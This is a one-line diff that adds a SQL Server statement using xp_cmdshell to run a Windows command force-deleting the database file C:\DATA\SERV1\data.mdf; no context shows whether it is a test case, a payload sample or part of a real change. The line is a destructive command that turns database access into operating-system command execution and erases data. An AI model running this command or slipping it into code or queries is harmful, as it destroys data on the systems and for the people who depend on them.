@@ -1,0 +1,1 @@
+EXEC xp_cmdshell ' del /f /q "C:\DATA\SERV1\data.mdf"';
